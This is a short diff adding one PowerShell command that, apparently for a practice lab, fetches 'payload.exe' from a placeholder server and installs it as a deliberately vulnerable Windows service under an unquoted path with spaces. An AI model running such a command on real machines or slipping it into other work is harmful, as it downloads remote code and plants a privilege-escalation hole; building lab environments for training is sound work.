@@ -1,0 +1,4 @@
+.\Install-VulnService.ps1     -ExecutableURL "<http://yourserver.com/payload.exe>"
+    -FolderPath "C:\Program Files\Unquoted Service Path"     -ServiceName "VulnService"
+    -DisplayName "Vulnerable Service"
+
